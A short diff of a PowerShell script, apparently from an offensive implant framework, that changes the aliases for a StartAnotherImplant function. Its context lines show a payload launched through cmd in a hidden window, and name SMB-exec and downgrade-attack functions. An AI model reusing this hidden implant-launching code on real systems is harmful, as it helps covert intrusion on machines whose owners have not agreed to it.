@@ -40,7 +40,8 @@ Function StartAnotherImplant {
         start-process -windowstyle hidden cmd -args "/c $payload"
     }
 }
-sal s startanotherimplant
+sal S StartAnotherImplant
+sal SAI StartAnotherImplant
 sal invoke-smblogin invoke-smbexec
 Function Invoke-DowngradeAttack 
 {
